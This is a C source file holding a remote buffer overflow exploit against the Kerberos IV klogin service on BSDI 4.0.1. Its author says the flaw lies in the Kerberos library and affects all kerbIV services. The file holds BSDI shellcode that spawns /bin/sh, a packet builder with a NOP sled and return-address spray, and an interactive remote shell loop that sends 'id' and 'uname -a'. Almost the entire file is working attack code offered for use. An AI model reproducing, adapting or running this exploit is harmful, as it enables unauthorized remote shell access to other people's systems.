/*
  
    klogin remote buffer overflow
    by duke (duke@viper.net.au)  
    
    tested on BSDI 4.0.1 klogin.
    The bug is actually in the kerberos library so this
    affects all kerb services (kerbIV). This code should need
    minimal (if any) modification to use on other kerberos services.
    it will only work if the file /etc/kerberosIV/krb.conf exists.  
    
    -duke
    
*/  
    
#include <stdio.h>
#include <string.h>
#include <netdb.h> 
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h> 
#include <sys/time.h>
#include <sys/select.h>
#include <netinet/in.h>
    
#define RET 0x8047830
#define NOPLEN 900 
#define MAX(x, y) ((x > y) ? x : y)
    
char bsdi_shell[]=
"\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c\x89\x76"  
"\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff\xff\xff\xff\x07"
"\xff\xe8\xdc\xff\xff\xff/bin/sh\x00";
    
void usage(char *);
void shell(int);
char *make_data(void);

int offset=0;

int main(int argc, char **argv)
{
  int sockfd, port=543, c;
  char *pkt, buf[1024];
  struct sockaddr_in sin;
  struct hostent *hp;

  while((c = getopt(argc, argv, "p:o:")) != EOF){
    switch(c){ 
      case 'p': port = atoi(optarg); break;
      case 'o': offset = atoi(optarg); break;
      default: usage(argv[0]);
    }
  }
  if(!argv[optind])
    usage(argv[0]);
  if((hp = gethostbyname(argv[optind])) == NULL){
    fprintf(stderr, "can't resolve host\n");
    exit(-1);
  } 
  pkt = make_data();
  bzero(&sin, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_port = htons(port);
  sin.sin_addr = *((struct in_addr *)hp->h_addr_list[0]);
  if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0){
    perror("socket");
    exit(-1);
  }
  if(connect(sockfd, (struct sockaddr *)&sin, sizeof(sin)) < 0){
    perror("connect"); 
    exit(-1);
  }   
  write(sockfd, pkt, 1221);
  free(pkt);
  shell(sockfd);
}   
  
void usage(char *p) 
{   
  fprintf(stderr, "usage: %s [ -p port ] [ -o offset ] <hostname>\n", p);
  fprintf(stderr, "-p: port to use\n");
  fprintf(stderr, "-o: offset\n");
  exit(0);
} 
  
char *make_data(void)
{   
  char *tmp, *ptr;
  int i;
  if((tmp=(char *)calloc(1250, sizeof(char))) == NULL){
    perror("calloc");  
    exit(-1);
  }   
  ptr = tmp;
  *ptr++ = 0x00;
  memcpy(ptr, "AUTHV0.1", 8);
  ptr+=8;
  for(i=0; i<8; i++)
    *ptr++ = 0x41;  
  *(unsigned long *)ptr = htonl(1200);
  ptr+=4;
  *(unsigned int *)ptr++ = 4;
  *ptr++ = 8;
  *ptr++ = 1;
  for(i=0; i < 600; i+=4)
    *(long *)&ptr[i] = RET + offset;
  memset(ptr+300, 0x90, NOPLEN);
  memcpy(ptr+800, bsdi_shell,
  sizeof(bsdi_shell));
  *(ptr+1000) = 0x00;
  return(tmp);
}   
    
void shell(int sock)
{ 
  fd_set rset;  
  char bu[1024];
  
  write(sock, "cd /; id; pwd; uname -a;\n", 25);
    
  FD_ZERO(&rset); 
  for(;;){
    FD_SET(fileno(stdin), &rset);
    FD_SET(sock, &rset);
    if(select(MAX(sock, fileno(stdin))+1, &rset, NULL, NULL, NULL) < 0){
      perror("select");  
      exit(-1);
    }
    if(FD_ISSET(sock, &rset)){
      char buf[1024]; 
      int n;
  
      bzero(buf, sizeof(buf));
      n = read(sock, buf, sizeof(buf)-1);
      if(n == 0){
        printf("EOF from server\n");
        exit(0);
      }
      if(n < 0){
        perror("read");
        exit(-1);
      } else {
        write(1, buf, n);
      }
    }
    
    if(FD_ISSET(fileno(stdin), &rset)){
      char buf[1024];
     
      bzero(buf, sizeof(buf));
      if(fgets(buf, sizeof(buf)-4, stdin) == NULL){
        printf("OK. Quitting\n");
        close(sock);
        exit(0); 
      } 
      strcat(buf, "\n");
      if(write(sock, buf, strlen(buf)) < 0){
        perror("write");
        exit(0);
      }
    }   
  }     
}     
